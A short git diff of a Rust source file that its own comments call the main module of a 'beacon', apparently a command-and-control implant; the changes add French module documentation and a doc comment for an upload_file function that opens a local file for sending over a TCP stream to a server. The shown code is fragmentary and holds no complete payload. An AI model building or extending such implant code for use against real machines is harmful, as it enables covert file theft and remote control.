@@ -1,3 +1,6 @@
+//! # Module Main.rs du beacon
+//! Ce module regroupe les fonctions et le point d'entrée main du programme représentant le beacon
+
 use std::process::Command;
 use std::io::BufReader;
 use std::io::BufRead;
@@ -12,7 +15,6 @@ use std::io::prelude::*;
 
 
 //use std::os::unix::net::SocketAddr;
-
 
 
 struct Resultat{
@@ -74,6 +76,7 @@ fn sleep_beacon(milli_second: u64){
     thread::sleep(ten_millis);
 }
 
+/// function that uploads a file to the server
 fn upload_file(stream: &mut TcpStream, path: &str) {
     let mut file = File::open(path).unwrap();
     
